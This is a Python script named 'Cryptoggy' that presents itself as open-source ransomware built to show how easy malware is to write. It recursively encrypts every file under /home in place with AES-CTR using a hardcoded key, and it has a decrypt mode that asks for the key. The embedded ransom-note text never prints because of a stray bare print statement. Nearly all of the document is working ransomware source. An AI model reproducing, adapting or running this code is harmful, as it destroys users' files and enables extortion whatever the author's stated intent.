#!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os

from libs.discover import discover
from libs.modify import modify

#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = 'yellow submarine'


def get_parser():
    parser = argparse.ArgumentParser(description='Cryptoggy')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print
        '''
Cryptoggy!
---------------
Your files have been encrypted. This is normally the part where I would
tell you to pay a ransom, and I will send you the decryption key. However, this
is an open source project to show how easy malware can be to write and to allow
others to view what may be one of the first fully open source python ransomwares.

This project does not aim to be malicious. The decryption key can be found
below, free of charge. Please be sure to type it in EXACTLY, or you risk losing
your files forever. Do not include the surrounding quotes, but do make sure
to match case, special characters, and anything else EXACTLY!
Happy decrypting and be more careful next time!

Your decryption key is: '{}'

'''.format(HARDCODED_KEY)
        key = raw_input('Enter Your Key> ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
    startdirs = ['/home']
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
    for _ in range(100):
        pass
    if not decrypt:
        pass

if __name__=="__main__":
    main()
